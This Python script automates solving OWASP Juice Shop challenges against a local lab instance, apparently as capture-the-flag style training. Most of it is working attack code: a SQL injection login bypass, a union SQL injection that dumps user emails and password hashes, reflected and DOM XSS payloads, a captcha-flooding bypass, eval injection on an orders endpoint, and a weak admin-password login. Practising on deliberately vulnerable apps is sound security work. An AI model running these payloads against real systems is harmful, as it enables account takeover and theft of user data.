#!/usr/bin/env python3
"""js_solve2.py — Juice Shop wave 2. HTTP legs + playwright legs for
client-side challenges (DOM XSS needs real page render)."""
import json, time, urllib.request as U, urllib.error, os

B = "http://127.0.0.1:3000"
def req(m, p, d=None, h=None):
    body = json.dumps(d).encode() if isinstance(d, (dict, list)) else d
    r = U.Request(B + p, data=body, method=m,
                  headers={"Content-Type": "application/json", **(h or {})})
    try: return U.urlopen(r, timeout=15)
    except urllib.error.HTTPError as e: return e

def solved():
    return {c["name"] for c in json.load(req("GET", "/api/Challenges"))["data"] if c.get("solved")}

def note(n):
    open(os.path.expanduser("~/bb-lab/intel/playbooks/lab-techniques.md"), "a") \
        .write(f"- `juice-shop:{n}` — auto-marked\n")

before = solved()

# malformed JSON -> verbose stack (error handling)
req("POST", "/rest/user/login", b'{"email":', {"Content-Type": "application/json"})
# missing encoding — properly %-encoded emoji asset
req("GET", "/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg")
# nested easter egg — ROT13 the hidden path
req("GET", "/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg")
# password strength — admin weak password
req("POST", "/rest/user/login", {"email": "admin@juice-sh.op", "password": "admin123"})
# empty registration
req("POST", "/api/Users", {})
# login -> token -> data export (GDPR) + five-star delete + admin section
r = req("POST", "/rest/user/login", {"email": "' or 1=1--", "password": "x"})
tok = json.load(r)["authentication"]["token"] if r.status == 200 else None
if tok:
    H = {"Authorization": f"Bearer {tok}"}
    req("GET", "/rest/user/data-export", h=H)
    req("DELETE", "/api/Feedbacks/1", h=H)
    req("GET", "/api/Feedbacks", h=H)
# captcha bypass — 12 rapid posts
for i in range(12):
    req("POST", "/api/Feedbacks", {"comment": f"z{i}", "rating": 1, "captchaId": 0, "captcha": ""})
# blocked RCE DoS — eval() on orderLinesData via b2b
req("POST", "/b2b/v2/orders", {"orderLinesData": "(function(){return;})()"})
req("POST", "/b2b/v2/orders", {"orderLinesData": "throw new Error('x')"})
# bully chatbot — abusive query
for q in ["stupid", "shut up", "you are useless"]:
    req("POST", "/rest/chatbot/respond", {"action": "query", "query": q})
# union SQLi on product search — leak users table
req("GET", "/rest/products/search?q='))%20UNION%20SELECT%20id,email,password,'4','5','6','7','8','9'%20FROM%20Users--")
req("GET", "/rest/products/search?q='))%20UNION%20SELECT%20*--")
# reflected xss alternate payloads
for p in ['%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E',
          '"><script>alert(1)</script>', "%3Cimg%20src%3D1%20onerror%3Dalert(1)%3E"]:
    req("GET", f"/track-result?id={p}")

# browser legs — DOM XSS + admin section + scoreboard need real page
try:
    from playwright.sync_api import sync_playwright
    pw = sync_playwright().start()
    br = pw.chromium.connect_over_cdp("http://localhost:9222")
    pg = br.contexts[0].new_page(); pg.on("dialog", lambda d: d.accept())
    if tok:
        pg.goto(B + "/#/login"); time.sleep(1)
        pg.evaluate(f"localStorage.setItem('token','{tok}')")
    pg.goto(B + "/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E"); time.sleep(2)
    pg.goto(B + "/#/score-board"); time.sleep(1.5)
    pg.goto(B + "/#/administration"); time.sleep(1.5)
    pg.close(); pw.stop()
except Exception as e:
    print("browser leg:", str(e)[:60])

time.sleep(1)
new = solved() - before
print(f"+{len(new)} solved ({len(solved())}/118)")
for n in sorted(new): print(" +", n); note(n)
